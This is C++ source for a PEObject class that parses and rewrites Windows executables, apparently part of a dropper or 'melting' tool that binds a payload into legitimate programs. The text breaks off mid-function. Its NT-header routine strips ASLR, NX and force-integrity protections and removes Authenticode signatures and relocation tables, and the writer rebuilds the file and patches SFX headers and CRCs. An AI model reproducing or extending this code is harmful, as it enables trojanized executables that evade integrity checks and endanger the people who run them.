#include <algorithm>
#include <cctype>
#include <iomanip>
#include <iostream>
#include <string>
#include <sstream>
using namespace std;

#include <boost/foreach.hpp>
#include "common.h"
//#include <Wintrust.h>

#include "../libs/AsmJit/AsmJit.h"

#include "DropperObject.h"
#include "Exceptions.h"
#include "FileBuffer.h"
#include "Manifest.h"
#include "PEObject.h"
#include "ResourceDataEntry.h"
#include "ResourceDirectory.h"
#include "ResourceDirectoryEntry.h"
#include "retcodes.h"
#include "XRefNames.h"

bool compareCavity(Cavity& a, Cavity& b) { return (a.size > b.size); }
void printCavity(Cavity& a) { cout << "\t[0x" << hex << (DWORD) a.ptr << "] CAVITY @ 0x" << a.va << " [" << dec << a.size << " bytes]" << endl; }

PEObject::PEObject(char* data, std::size_t size)
: _rawData(data), _fileSize(size), _eofData(NULL), _sectionHeadersPadding(NULL), _boundImportTable(NULL)
{
	memset(&_resources, 0, sizeof(_resources));
	memset(&functionIndex, 0, sizeof(functionIndex));
	memset(&_hookPointer, 0, sizeof(_hookPointer));

	exeType = 0;
}

PEObject::~PEObject(void)
{
	if (_eofData) {
		delete _eofData;
	}
}

bool PEObject::parse()
{
	assert(_rawData);

	LPVOID bu = this->_rawData;	
	for(DWORD i=0; i<0x3000; i++)
	{
		if(!memcmp(&this->_rawData[i], "_SFX_CAB_EXE_PATH", 17))
		{
			printf("For security reason I'm not gonna melt cab files\n");
			return false;
		}
	}

	cout << "Parsing PE." << endl;
	
	if (_parseDOSHeader() == false)
		return false;
	
	if (_parseNTHeader() == false)
		return false;

	/*
	if (_parseIAT() == false)
		return false;
	*/

	try {
		_parseResources();
	} catch (parsing_error &e) {
		cout << e.what() << endl;
		return false;
	}
	
	if (_parseText() == false)
		return false;
	
	return true;
}

bool PEObject::_parseDOSHeader()
{
	this->_dosHeader.header = (IMAGE_DOS_HEADER*)this->_rawData;
	
	if( this->_dosHeader.header->e_magic != IMAGE_DOS_SIGNATURE ) {
		cout << "Invalid DOS header signature" << endl;
		return false;
	}
	
	this->_dosHeader.stub_size = this->_dosHeader.header->e_lfanew - sizeof(IMAGE_DOS_HEADER);
	this->_dosHeader.stub = this->_rawData + sizeof(IMAGE_DOS_HEADER);
	
	return true;	
}

#if 0
bool PEObject::isAuthenticodeSigned()
{
	// check if file is Authenticode signed

	DWORD certificate_table = 0;
	certificate_table = this->_ntHeader->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_SECURITY].VirtualAddress;
	if ( certificate_table && certificate_table < _fileSize) {
		WIN_CERTIFICATE* wincert = (WIN_CERTIFICATE*) ((DWORD)this->_rawData + certificate_table);

		/*
		cout << "Cert Revision : " << hex << wincert->wRevision << endl;
		cout << "Cert Type     : " << hex << wincert->wCertificateType;
		if (wincert->wCertificateType == 0x0002)
			cout << " (Authenticode)";
		cout << endl;
		*/

		return true;
	}

	return false;
}
#endif

bool PEObject::_parseNTHeader()
{
	_ntHeader = (IMAGE_NT_HEADERS*) atOffset(_dosHeader.header->e_lfanew);
	if (_ntHeader == NULL) {
		cout << "Invalid PE header offset." << endl;
		return false;
	}
	
	// signature
	if( _ntHeader->Signature != IMAGE_NT_SIGNATURE ) 
	{
		cout << "Invalid NT header signature" << endl;
		return false;
	}
	
	// check if executable is Win32 PE for IA-32
	if ( _ntHeader->FileHeader.Machine != IMAGE_FILE_MACHINE_I386 
		&& _ntHeader->OptionalHeader.Subsystem != IMAGE_SUBSYSTEM_WINDOWS_GUI)
	{
		cout << "Executable is not for IA-32 Win32 systems." << endl;
		return false;
	}
	
	// check if ASLR or NXCOMPAT is enabled, in case clear them
	if ( _ntHeader->OptionalHeader.DllCharacteristics & IMAGE_DLLCHARACTERISTICS_DYNAMIC_BASE)
		_ntHeader->OptionalHeader.DllCharacteristics &= ~IMAGE_DLLCHARACTERISTICS_DYNAMIC_BASE;
	if ( _ntHeader->OptionalHeader.DllCharacteristics & IMAGE_DLLCHARACTERISTICS_NX_COMPAT)
		_ntHeader->OptionalHeader.DllCharacteristics &= ~IMAGE_DLLCHARACTERISTICS_NX_COMPAT;
	
	// check if FORCE_INTEGRITY is enabled, in case clear it
	//  testcase: http://didierstevens.com/files/software/TestIntegrityCheckFlag.zip
	if (_ntHeader->OptionalHeader.DllCharacteristics & IMAGE_DLLCHARACTERISTICS_FORCE_INTEGRITY)
		_ntHeader->OptionalHeader.DllCharacteristics &= ~IMAGE_DLLCHARACTERISTICS_FORCE_INTEGRITY;

	// CHECK FOR BOUND IMPORT TABLE, IF PRESENT RESET IT
	if (_ntHeader->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BOUND_IMPORT].VirtualAddress)
	{
		cout << "Resetting BOUND IMPORT TABLE" << endl;
		_ntHeader->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BOUND_IMPORT].VirtualAddress = 0;
		_ntHeader->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BOUND_IMPORT].Size = 0;
	}
	
	// CHECK FOR RELOCATION SECTION, IF PRESENT RESET IT
	// this works since we reset also the ASLR, thus .reloc is not going to be used by the loader
	if (_ntHeader->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress)
	{
		cout << "Resetting RELOCATIONS TABLE" << endl;
		_ntHeader->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress = 0;
		_ntHeader->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].Size = 0;
	}

//#if 0
	if (_ntHeader->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_SECURITY].VirtualAddress) 
	{
		cout << "Resetting Authenticode signature." << endl;
		_ntHeader->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_SECURITY].VirtualAddress = 0;
		_ntHeader->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_SECURITY].Size = 0;
	}
//#endif

	/*
	// sections
	*/
	cout << "File has " << _ntHeader->FileHeader.NumberOfSections << " sections" << endl;
	
	IMAGE_SECTION_HEADER *sectionHeader  = NULL;
	
	sectionHeader = (IMAGE_SECTION_HEADER *)atOffset(_dosHeader.header->e_lfanew + sizeof(IMAGE_NT_HEADERS));
	if (sectionHeader == NULL)
		return false;
	
	std::size_t firstSectionOffset = 0xffffffff;
	
	for ( DWORD iC = 0; iC < _ntHeader->FileHeader.NumberOfSections ; iC++ )
	{
		// create a new section object
		GenericSection* section = new GenericSection(*this, (char*)sectionHeader->Name, sectionHeader);
		
		if(!memcmp((const char*)sectionHeader->Name, ".ndata", 6))
		{
			cout << "NSIS installer detected!" << endl;
			exeType = EXE_TYPE_NSIS_INSTALLER;
		}
		if(!memcmp((const char*)sectionHeader->Name, "_winzip_", 8))
		{
			cout << "WinZip SFX detected!" << endl;
			exeType = EXE_TYPE_WINZIP_SFX;
		}

		// add section to list
		_sections.push_back(section);
		
		// reading from file
		section->SetFilePointer(_rawData, sectionHeader->SizeOfRawData);
		
		// update first section offset
		if (section->PointerToRawData() != 0 && section->PointerToRawData() < firstSectionOffset)
			firstSectionOffset = section->PointerToRawData();
		
		// file validity heuristics
		// check if size of sections is > file size
		if (section->SizeOfRawData() > _fileSize) {
			cout << "INVALID PE: raw size of section " << iC << " is greater than file size." << endl;
			return false;
		}
		
		/*
		cout << "Section " << iC << endl;
		cout << "\tVirtualAddress  : 0x" << right << std::setw(8) << std::setfill('0') << hex << section->VirtualAddress() + this->_ntHeader->OptionalHeader.ImageBase << endl;
		cout << "\tPointerToRawData: 0x" << std::setw(8) << std::setfill('0') << hex << section->PointerToRawData() << endl;
		cout << "\tSizeOfRawData   : 0x" << std::setw(8) << std::setfill('0') << hex << section->SizeOfRawData() << endl;
		cout << endl;
		*/
		
		sectionHeader++;
	}
	
	// cout << "First section offset: 0x" << std::setw(8) << std::setfill('0') << hex << firstSectionOffset << endl;
	
	// check if there is some padding between section headers and sections data
	std::size_t sectionHeadersSize = sizeof(IMAGE_SECTION_HEADER) * _sections.size();
	std::size_t sectionHeadersOffset = _dosHeader.header->e_lfanew + sizeof(IMAGE_NT_HEADERS);
	
	if (sectionHeadersOffset + sectionHeadersSize < firstSectionOffset) {
		_sectionHeadersPaddingSize = firstSectionOffset - (sectionHeadersOffset + sectionHeadersSize);
		_sectionHeadersPadding = _rawData + sectionHeadersOffset + sectionHeadersSize;
	}
	
	// check for EOF data
	
	sectionHeader--;
	if (sectionHeader->PointerToRawData + sectionHeader->SizeOfRawData < _fileSize) {
		
		cout << "EOF data found." << endl; 
		
		_eofData = new GenericSection(*this, ".EOF");
		_eofData->setEof(true);
		_eofData->SetData(_rawData 
			+ _sections[_sections.size() - 1]->PointerToRawData() 
			+ _sections[_sections.size() - 1]->SizeOfRawData(), _fileSize - (sectionHeader->PointerToRawData + sectionHeader->SizeOfRawData));
		_eofData->SetVirtualAddress(_sections[_sections.size() - 1]->VirtualAddress() 
			+ _sections[_sections.size() - 1]->VirtualSize());
		_eofData->SetSizeOfRawData( _fileSize - (sectionHeader->PointerToRawData + sectionHeader->SizeOfRawData));
		_eofData->SetVirtualSize(sectionHeader->SizeOfRawData);
	}
	
	return true;
}


bool PEObject::saveToFile(std::string filename)
{	
	try {
		std::ofstream outfile(filename.c_str(), ios::out | ios::binary);
		
		_ntHeader->FileHeader.NumberOfSections = _sections.size();
		
		/*** write DOS header ***/
		cout << "Writing DOS Header @ 0x" << right << setfill('0') << setw(8) << hex << outfile.tellp() << endl;
		outfile.write( reinterpret_cast<char*>(_dosHeader.header) , sizeof(IMAGE_DOS_HEADER) );

		/*** write DOS stub ***/
		cout << "Writing DOS Stub @ 0x" << setfill('0') << setw(8) << hex << outfile.tellp() << endl;
		outfile.write( _dosHeader.stub , _dosHeader.stub_size );

		ULONG winzipSkew=0;
		/*** fix section headers ***/
		for (std::size_t i = 1; i <_sections.size(); i++) {
			GenericSection* prevSection = _sections[i-1];

			// find first section with PointerToRawData != 0
			for(std::size_t x = i; x>0;)
			{
				x -= 1;
				if(_sections[x]->PointerToRawData())
				{
					if(!memcmp(_sections[i]->Name().c_str(), "_winzip_", 8))
						if(_sections[i]->Header()->PointerToRawData != _sections[x]->PointerToRawData() + alignTo(_sections[x]->SizeOfRawData(), fileAlignment()))
							winzipSkew = (_sections[x]->PointerToRawData() + alignTo(_sections[x]->SizeOfRawData(), fileAlignment())) - _sections[i]->Header()->PointerToRawData;

					_sections[i]->Header()->PointerToRawData = _sections[x]->PointerToRawData() + alignTo(_sections[x]->SizeOfRawData(), fileAlignment());

					break;	
				}
			}
			_sections[i]->Header()->VirtualAddress = prevSection->VirtualAddress() + alignTo(prevSection->VirtualSize(), sectionAlignment());
		}

		if(winzipSkew)
			for(std::size_t i = 0; i<_sections.size(); i++) {
				GenericSection* Section = _sections[i];
				if(memcmp(Section->Name().c_str(), ".data", 5))
					continue;
		
				char *sectionData = Section->data();
				char sfxHeaderOffset = 0;
				
				// search for sfx header
				for(std::size_t x=0; x<_cpp_min(0x80, Section->size()); x++)
					if(!memcmp(&sectionData[x], "NMC", 3) && !memcmp(&sectionData[x+4], "sfx", 3))
					{
						sfxHeaderOffset = x;
						break;
					}

				if(sfxHeaderOffset)
				{
					// clear CRC
					*((PULONG)&sectionData[sfxHeaderOffset+0x8]) = 0x0;
					// reloc pointer to _winzip_ section
					*((PULONG)&sectionData[sfxHeaderOffset+0xc]) += winzipSkew;
					*((PULONG)&sectionData[sfxHeaderOffset+0x10]) += winzipSkew;
					*((PULONG)&sectionData[sfxHeaderOffset+0x14]) += winzipSkew;
					
					break;
				}
			}

		/*** fix SizeOfImage ***/
		_ntHeader->OptionalHeader.SizeOfImage = 
			_sections.back()->VirtualAddress() + _sections.back()->VirtualSize();
		
		/*** write NT headers ***/
		cout << "Writing NT Header @ 0x" << setfill('0') << setw(8) << hex << outfile.tellp() << endl;
		outfile.write(reinterpret_cast<char*>(_ntHeader), sizeof(IMAGE_NT_HEADERS32)); 
		
		/*** copy section headers ***/
		for (std::size_t i = 0; i < _sections.size(); i++) {
			cout << "Writing Section " << i << " Header @ 0x" << setfill('0') << setw(8) << hex << outfile.tellp() << endl;
			outfile.write(reinterpret_cast<char*>(_sections[i]->Header()), sizeof(IMAGE_SECTION_HEADER));
		}
		
		/*** copy padding data, if present ***/
		/*
		if (_sectionHeadersPadding) {
			cout << "Writing Section Headers padding @ 0x" << setfill('0') << setw(8) << hex << outfile.tellp() << endl;
			outfile.write(_sectionHeadersPadding, _sectionHeadersPaddingSize);
		}
		*/
		
		/* move pointer to beginning of first section data */
		std::streampos pos = 0xFFFFFFFF;
		for (std::size_t i = 0; i < _sections.size(); i++) {
			if (_sections[i]->PointerToRawData() != 0 && _sections[i]->PointerToRawData() < (DWORD)pos)
				pos = _sections[i]->PointerToRawData();
		}
		outfile.seekp(pos);
		
		/*** copy sections data ***/
		for (std::size_t i = 0; i < _sections.size(); i++) {
			cout << "Writing Section " << i << " data @ 0x" << setfill('0') << setw(8) << hex << outfile.tellp() << "[" << _sections[i]->SizeOfRawData() << "]" << endl;
			// cout << "DATA " << (DWORD)_sections[i]->data() << endl;
			char*  data = _sections[i]->data();
			size_t size = _sections[i]->SizeOfRawData();
			
			if (data && size > 0)
				outfile.write(data, size);
			while (0) ;
		}
		
		/*** copy EOF data ***/
		if (_eofData) {
			cout << "Writing EOF data @ 0x" << setfill('0') << setw(8) << hex << outfile.tellp() << endl;
			outfile.write(_eofData->data(), _eofData->SizeOfRawData());
		}
		
		outfile.close();
		cout << "Writing done." << endl;
	} catch ( iostream::failure &e) {
		cout << "Error writing on filesystem [" << e.what() << "]" << endl;
		return false;
	}
	
	return true;
}


DWORD PEObject::offset( DWORD rva )
{
	BOOL bFound = FALSE;
	DWORD iC = 0;
	
	// TODO resolving offsets NOT IN SECTIONS will not work!!!
	
	for ( iC = 0; iC < _sections.size() ; iC++ )
	{
		DWORD VA = _sections[iC]->VirtualAddress();
		DWORD PRAW = _sections[iC]->PointerToRawData();
		DWORD SRAW = _sections[iC]->SizeOfRawData();
		if( VA /* && rva >= VA */ && rva <= ( VA + SRAW ) ) 
		{
			if (PRAW)
				return (rva + PRAW - VA);
			else
				return rva;
		}
	}
	
	return 0;
}


GenericSection* PEObject::getSection( DWORD directoryEntryID )
{
	DWORD rva = _ntHeader->OptionalHeader.DataDirectory[directoryEntryID].VirtualAddress;
	return findSection(rva);
}


IATEntry const & PEObject::getIATEntry( std::string const dll, std::string const call )
{
	IATEntries::iterator iter = _iat.begin();
	
	for ( iter = _iat.begin(); iter != _iat.end(); iter++ )
	{
		DWORD addr = (*iter).first;
		
		IATEntry& entry = (*iter).second;
		std::string aDll = entry.dll();
		std::string aCall = entry.call();
		std::transform(aDll.begin(), aDll.end(), aDll.begin(), tolower);
		
		if (!aDll.compare(dll) && !aCall.compare(call))
			return entry;
	}

	throw IATEntryNotFound();
}

GenericSection* PEObject::findSection( DWORD rva )
{
	std::vector<GenericSection*>::iterator iter = _sections.begin();

	for (; iter != _sections.end(); iter++) {
		GenericSection* section = *iter;
		if (rva >= section->VirtualAddress()
			&& rva < section->VirtualAddress() + section->SizeOfRawData())
			return section;
	}

	if (_eofData) 
	{
		if (rva >= _eofData->VirtualAddress() && rva < _eofData->VirtualAddress() + _eofData->SizeOfRawData()) {
			return _eofData;
		}
	}

	return NULL;
}

void PEObject::setSection( DWORD directoryEntryID, GenericSection* section )
{
	setSection(directoryEntryID, section->VirtualAddress(), section->VirtualSize());
}

void PEObject::setSection( DWORD directoryEntryID, DWORD VirtualAddress, DWORD VirtualSize)
{
	_ntHeader->OptionalHeader.DataDirectory[directoryEntryID].VirtualAddress = VirtualAddress;
	_ntHeader->OptionalHeader.DataDirectory[directoryEntryID].Size = VirtualSize;
}


unsigned char* PEObject::GetOEPCode()
{
	DWORD oep = _ntHeader->OptionalHeader.AddressOfEntryPoint;
	cout << "OEP " << hex << oep << " @ offset " << hex << offset(oep) << endl;
	return (unsigned char*) _rawData + offset(oep);
}


void PEObject::writeData( DWORD rva, char * data, size_t size )
{
	char * ptr = _rawData + offset(rva);
	memcpy(ptr, data, size);
}

bool PEObject::_parseResources()
{
	GenericSection* resSection = getSection(IMAGE_DIRECTORY_ENTRY_RESOURCE);
	if (!resSection) // file has no resources
		return true;
	
	//
	// check if resource section is last one
	//
	// if (resSection != _sections.back())
	//	throw parsing_error("Resource section is not the last section in file.");
	
	try {
		_resources.dir = _scanResources(resSection->data());
	} catch (InvalidResourcesException& e) {
		cout << e.what() << endl;
		throw parsing_error(e.what());
	}
	
	if (_resources.dir == NULL)
		throw parsing_error("Resource section scan failed.");
	
	_resources.size = resSection->VirtualSize();
	if (!_resources.size) {
		_resources.dir = NULL;
		throw parsing_error("Virtual size of resource section is zero.");
	}
	
	cout << "*** Resources size: " << _resources.size << endl;
	
	return true;
}

ResourceDirectory* PEObject::_scanResources(char const * const data)
{
	if (!data)
		return NULL;
	
	PRESOURCE_DIRECTORY rdRoot = PRESOURCE_DIRECTORY(data);
	_resources.dir = _scanResources(rdRoot, rdRoot, 0);
	
	return _resources.dir;
}

ResourceDirectory* PEObject::_scanResources( PRESOURCE_DIRECTORY rdRoot, PRESOURCE_DIRECTORY rdToScan, DWORD level )
{
	PIMAGE_RESOURCE_DATA_ENTRY rde = NULL;
	WCHAR* szName = NULL;

	PIMAGE_RESOURCE_DIRECTORY resDir = PIMAGE_RESOURCE_DIRECTORY(rdToScan);

#if 0
	INDENT; cout << "Major Version    : " << hex << resDir->MajorVersion << endl;
	INDENT; cout << "Minor Version    : " << hex << resDir->MinorVersion << endl;
	INDENT; cout << "TimeDateStamp    : " << hex << resDir->TimeDateStamp << endl;
	INDENT; cout << "Characteristics  : " << hex << resDir->Characteristics << endl;
	INDENT; cout << "N. IdEntries     : " << hex << resDir->NumberOfIdEntries << endl;
	INDENT; cout << "N. NamedEntries  : " << hex << resDir->NumberOfNamedEntries << endl;
#endif

	ResourceDirectory* rdc = new ResourceDirectory(resDir);
	for (int i = 0; i < rdToScan->Header.NumberOfNamedEntries + rdToScan->Header.NumberOfIdEntries; i++)
	{
		if (rdToScan->Entries[i].NameIsString) {
			PIMAGE_RESOURCE_DIR_STRING_U rds = 
				PIMAGE_RESOURCE_DIR_STRING_U(rdToScan->Entries[i].NameOffset + (char*)rdRoot);

			szName = new WCHAR[rds->Length + 1];
			wmemcpy(szName, rds->NameString, rds->Length);
			szName[rds->Length] = '\0';
#if 0			
			INDENT; INDENT; cout << "Name        : " << szName << endl;
#endif		
		} else {
			szName = MAKEINTRESOURCEW(rdToScan->Entries[i].Id);

#if 0
			INDENT; INDENT; cout << "Name        : " << dec << (DWORD)szName << endl;
			INDENT; INDENT; cout << "OffsetToData: " << hex << rdToScan->Entries[i].OffsetToData << endl;
#endif
		}

		if (rdToScan->Entries[i].DataIsDirectory) {
			// DIRECTORY ENTRY
			rdc->AddEntry(
				new ResourceDirectoryEntry(szName, 
				_scanResources(
				rdRoot, 
				PRESOURCE_DIRECTORY(rdToScan->Entries[i].OffsetToDirectory + (PBYTE)rdRoot),
				level + 1
				)
				)
				);
		} else {
			// DATA ENTRY
			
			rde = PIMAGE_RESOURCE_DATA_ENTRY(rdToScan->Entries[i].OffsetToData + (PBYTE)rdRoot);
			GenericSection* section = findSection(rde->OffsetToData);
			
#if 0
			INDENT; INDENT; INDENT; cout << "OffsetToData: " << hex << rde->OffsetToData << endl;
			INDENT; INDENT; INDENT; cout << "Size        : " << dec << rde->Size << endl;
			INDENT; INDENT; INDENT; cout << "Codepage    : " << hex << rde->CodePage << endl;
			INDENT; INDENT; INDENT; cout << "Reserved    : " << hex << rde->Reserved << endl;
#endif
			
			ResourceDataEntry * newRde = NULL;
			
			if (section) {
				PBYTE data = (PBYTE)section->data() + rde->OffsetToData - section->VirtualAddress();
				newRde = new ResourceDataEntry(
					data,
					rde->OffsetToData,
					rde->Size,
					rde->CodePage);
				
				newRde->SetData(data, rde->Size);
#if 0
				if ( section == getSection(IMAGE_DIRECTORY_ENTRY_RESOURCE) ) {
					newRde->SetAdded(true);
					newRde->SetData(data, rde->Size);
					// cout << "Resource data is in RESOURCE section." << endl;
				} else {
					// cout << "Resource data is outside RESOURCE section." << endl;
				}
#endif			
			} else {
				cout << "NO SECTION FOUND FOR RESOURCE" << endl;
				newRde = new ResourceDataEntry(
					rde->OffsetToData,
					rde->Size,
					rde->CodePage);
			}
			
			rdc->AddEntry(
				new ResourceDirectoryEntry(
				szName,
				newRde
				)
				);
		}
		
		if (!IS_INTRESOURCE(szName))
			delete [] szName;
	}

	return rdc;
}

bool PEObject::_updateResource( WCHAR* type, WCHAR* name, LANGID lang, PBYTE data, DWORD size )
{
	ResourceDirectory* nameDir = NULL;
	ResourceDirectory* langDir = NULL;
	ResourceDataEntry* dataEntry = NULL;
	IMAGE_RESOURCE_DIRECTORY rd = {0, /* time(0), */};
	int typeIdx = -1, nameIdx = -1, langIdx = -1;

	typeIdx = _resources.dir->Find(type);
	if (typeIdx > -1) {
		nameDir = _resources.dir->GetEntry(typeIdx)->GetSubDirectory();
		nameIdx = nameDir->Find(name);
		if (nameIdx > -1) {
			langDir = nameDir->GetEntry(nameIdx)->GetSubDirectory();
			langIdx = langDir->Find(lang);
			if (langIdx > -1) {
				dataEntry = langDir->GetEntry(langIdx)->GetDataEntry();
			}
		}
	}

	if (data) {
		// replace/add resource
		if (dataEntry) {
			dataEntry->SetAdded(true);
			dataEntry->SetData(data, size);
			return true;
		}

		if (!nameDir) {
			nameDir = new ResourceDirectory(&rd);
			_resources.dir->AddEntry(new ResourceDirectoryEntry(type, nameDir));
		}
		if (!langDir) {
			langDir = new ResourceDirectory(&rd);
			nameDir->AddEntry(new ResourceDirectoryEntry(name, langDir));
		}
		if (!dataEntry) {
			dataEntry = new ResourceDataEntry(data, 0, size);
			dataEntry->SetAdded(true);
			langDir->AddEntry(new ResourceDirectoryEntry(MAKEINTRESOURCEW(lang), dataEntry));
		}
	} else 
		return false;

	return true;
}

std::size_t PEObject::_writeResources( char* data, DWORD virtualAddress )
{
	DWORD level = 0;
	
	char* buffer = data;
	PBYTE ptr = (PBYTE)buffer;
	
	cout << __FUNCTION__ << endl;
	
	// cout << "[1] seeker base at 0x" << hex << (DWORD)seeker << endl;
	
	queue<ResourceDirectory*> dirs;
	queue<ResourceDataEntry*> dataEntries;
	queue<ResourceDataEntry*> dataEntries2;
	queue<ResourceDirectoryEntry*> strings;
	
	dirs.push(_resources.dir);
	
	// IMAGE_RESOURCE_DIRECTORY
	while (!dirs.empty()) 
	{
		// take first dir
		ResourceDirectory* crd = dirs.front();

		// WRITE THE HEADER
		IMAGE_RESOURCE_DIRECTORY rdDir = crd->GetInfo();

		//INDENT; cout << "IMAGE_RESOURCE_DIR: " << endl;
		//INDENT; cout << "Major Version    : " << hex << rdDir.MajorVersion << endl;
		//INDENT; cout << "Minor Version    : " << hex << rdDir.MinorVersion << endl;
		//INDENT; cout << "TimeDateStamp    : " << hex << rdDir.TimeDateStamp << endl;
		//INDENT; cout << "Characteristics  : " << hex << rdDir.Characteristics << endl;
		//INDENT; cout << "N. IdEntries     : " << hex << rdDir.NumberOfIdEntries << endl;
		//INDENT; cout << "N. NamedEntries  : " << hex << rdDir.NumberOfNamedEntries << endl;

		memcpy(ptr, &rdDir, sizeof(IMAGE_RESOURCE_DIRECTORY));
		crd->writtenAt = DWORD(ptr);
		ptr += sizeof(IMAGE_RESOURCE_DIRECTORY);

		//cout << "[2] seeker @ 0x" << hex << (DWORD)seeker << " incremented by " << dec << sizeof(IMAGE_RESOURCE_DIRECTORY) << endl;

		// for each entry in directory
		for (int i = 0; i < crd->CountEntries(); i++)
		{
			// if it has name, we add the string
			if (crd->GetEntry(i)->HasName())
				strings.push(crd->GetEntry(i));

			// if it's a directory, add the dir to queue
			if (crd->GetEntry(i)->IsDataDirectory())
				dirs.push(crd->GetEntry(i)->GetSubDirectory());
			else
			{
				ResourceDataEntry* dataEntry = crd->GetEntry(i)->GetDataEntry();
				if (dataEntry) {
					// add to queue for header writing
					dataEntries.push(dataEntry);

					// add to queue only raw data entries, RVA are already present in PE
					if (dataEntry->IsAdded()) {
						dataEntries2.push(dataEntry);
					}
				}
			}

			// WRITE EACH ENTRY
			PIMAGE_RESOURCE_DIRECTORY_ENTRY rDirE = (PIMAGE_RESOURCE_DIRECTORY_ENTRY)ptr;
			memset(rDirE, 0, sizeof(IMAGE_RESOURCE_DIRECTORY_ENTRY));
			rDirE->DataIsDirectory = crd->GetEntry(i)->IsDataDirectory();
			rDirE->Id = (crd->GetEntry(i)->HasName()) ? 0 : crd->GetEntry(i)->GetId();
			rDirE->NameIsString = (crd->GetEntry(i)->HasName()) ? 1 : 0;

			// CopyMemory(seeker, &rDirE, sizeof(IMAGE_RESOURCE_DIRECTORY_ENTRY));
			crd->GetEntry(i)->writtenAt = DWORD(ptr);
			ptr += sizeof(IMAGE_RESOURCE_DIRECTORY_ENTRY);

			//INDENT; cout << "Name        : " << hex << rDirE->Name << endl;
			//INDENT; cout << "OffsetToData: " << hex << rDirE->OffsetToData << endl;

			//cout << "[3] seeker @ 0x" << hex << (DWORD)seeker << " incremented by " << dec << sizeof(IMAGE_RESOURCE_DIRECTORY_ENTRY) << endl;
		}

		// remove dir just processed
		dirs.pop();
	}

	// IMAGE_RESOURCE_DATA_ENTRY
	while (!dataEntries.empty())
	{
		// WRITE DATA ENTRY
		ResourceDataEntry* cRDataE = dataEntries.front();
		PIMAGE_RESOURCE_DATA_ENTRY rDataE = (PIMAGE_RESOURCE_DATA_ENTRY) ptr;
		memset(rDataE, 0, sizeof(IMAGE_RESOURCE_DATA_ENTRY));
		rDataE->OffsetToData = cRDataE->GetRva();
		rDataE->CodePage = cRDataE->GetCodePage();
		rDataE->Size = cRDataE->GetSize();

		// CopyMemory(seeker, &rDataE, sizeof(IMAGE_RESOURCE_DATA_ENTRY));
		cRDataE->writtenAt = DWORD(ptr);
		ptr += sizeof(IMAGE_RESOURCE_DATA_ENTRY);

		//INDENT; cout << "RESOURCE_DATA_ENTRY" << endl;
		//INDENT; cout << "OffsetToData: " << hex << rDataE->OffsetToData << endl;
		//INDENT; cout << "Size        : " << rDataE->Size << endl;
		//INDENT; cout << "Codepage    : " << hex << rDataE->CodePage << endl;
		//INDENT; cout << "Reserved    : " << rDataE->Reserved << endl;

		// cout << "[4] seeker @ 0x" << hex << (DWORD)seeker << " incremented by " << dec << sizeof(IMAGE_RESOURCE_DATA_ENTRY) << endl;

		dataEntries.pop();
	}

	// STRINGS
	while (!strings.empty()) 
	{
		ResourceDirectoryEntry* cRDirE = strings.front();

		PIMAGE_RESOURCE_DIRECTORY_ENTRY(cRDirE->writtenAt)->NameOffset = DWORD(ptr) - DWORD(buffer);
		
		WCHAR* szName = cRDirE->GetName();
		WORD iLen = wcslen(szName) + 1;

		*(WORD*)ptr = iLen - 1;
		ptr += sizeof(WORD);
		wmemcpy((WCHAR*)ptr, szName, iLen);
		ptr += iLen * sizeof(WCHAR);

		//cout << "[5] seeker @ 0x" << hex << (DWORD)seeker << " incremented by " << dec << iLen * sizeof(WCHAR) << endl;
		//cout << "[6] seeker @ 0x" << hex << (DWORD)seeker << " incremented by " << dec << sizeof(WORD) << endl;

		delete [] szName;

		strings.pop();
	}

	// RAW DATA
	while (!dataEntries2.empty()) {
		ResourceDataEntry* cRDataE = dataEntries2.front();
		PCHAR data = (PCHAR)cRDataE->GetData();
		
		if (data != NULL)
		{
			DWORD size = cRDataE->GetSize();
			memcpy(ptr, data, size);
			PIMAGE_RESOURCE_DATA_ENTRY dataEntry = (PIMAGE_RESOURCE_DATA_ENTRY)cRDataE->writtenAt;
			dataEntry->OffsetToData = ( (DWORD)ptr - (DWORD)buffer ) + virtualAddress;
			
			cout << "RSRC written " << dec << size << " bytes at offset 0x" << hex << dataEntry->OffsetToData << endl;
			//cout << "[7] seeker @ 0x" << hex << (DWORD)seeker;
			
			DWORD increment = RALIGN(cRDataE->GetSize(), 8);
			ptr += increment;

			//cout << " incremented by " << dec << increment << " for size " << dec << size << endl;
		}
		
		dataEntries2.pop();
	}
	
	_resources.size = (DWORD)ptr - (DWORD)buffer;
	
	cout << "*** written resource size " << dec << _resources.size << endl;

	_setResourceOffsets(_resources.dir, DWORD(buffer));
	
	return _resources.size;
}

DWORD PEObject::_sizeOfResources()
{
	DWORD size = 0;

	queue<ResourceDirectory*> dirs;
	queue<ResourceDataEntry*> dataEntries;
	queue<ResourceDataEntry*> dataEntries2;
	queue<ResourceDirectoryEntry*> strings;
	
	dirs.push(_resources.dir);
	
	// IMAGE_RESOURCE_DIRECTORY
	while (!dirs.empty()) 
	{
		size += sizeof(IMAGE_RESOURCE_DIRECTORY);
		
		ResourceDirectory* crd = dirs.front();
		for (int i = 0; i < crd->CountEntries(); i ++)
		{
			// if it has name, we add the string
			if (crd->GetEntry(i)->HasName())
				strings.push(crd->GetEntry(i));
			
			// if it's a directory, add the dir to queue
			if (crd->GetEntry(i)->IsDataDirectory())
				dirs.push(crd->GetEntry(i)->GetSubDirectory());
			else 
			{
				ResourceDataEntry* dataEntry = crd->GetEntry(i)->GetDataEntry();
				if (dataEntry) {
					// if it's a data entry, add it to both data queues
					dataEntries.push(dataEntry);

					// add to queue only raw data entries, RVA are already present in PE
					if (dataEntry->GetData() != NULL)
						dataEntries2.push(dataEntry);
				}
			}
			size += sizeof(IMAGE_RESOURCE_DIRECTORY_ENTRY);
		}
		dirs.pop();
	}

	// IMAGE_RESOURCE_DATA_ENTRY
	while (!dataEntries.empty())
	{	
		size += sizeof(IMAGE_RESOURCE_DATA_ENTRY);
		dataEntries.pop();
	}

	// STRINGS
	while (!strings.empty()) 
	{
